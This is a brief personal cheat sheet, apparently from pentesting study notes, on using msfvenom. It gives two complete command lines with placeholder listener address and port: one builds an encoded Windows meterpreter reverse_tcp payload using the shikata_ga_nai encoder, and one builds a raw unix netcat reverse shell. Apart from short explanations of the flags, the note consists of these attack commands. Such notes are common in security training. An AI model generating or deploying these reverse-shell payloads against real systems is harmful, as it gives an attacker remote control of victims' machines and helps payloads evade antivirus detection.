# Msfvenom
Tool combining ```msfpayload``` and ```msfencode``` <br/>
*As far as i know it's uses mainly to generate various reverse shell*<br/>
Here are the one i used:<br/>
* ```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<listening_local_IP> LPORT=<listening_local_port> -f <format> -o <output_file.format>```<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;```-a <arch>``` to specify the architecture to use for ```-p / --payload``` & ```-e / --encoder```<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;```-l <value>``` to list supported payloads (```--list-options``` for arguments), formats, encoder and architectures 
* ```msfvenom -p cmd/unix/reverse_netcat LHOST=<listening_local_IP> LPORT=<listening_local_port> R```<br/>
```R``` export the payload in raw format
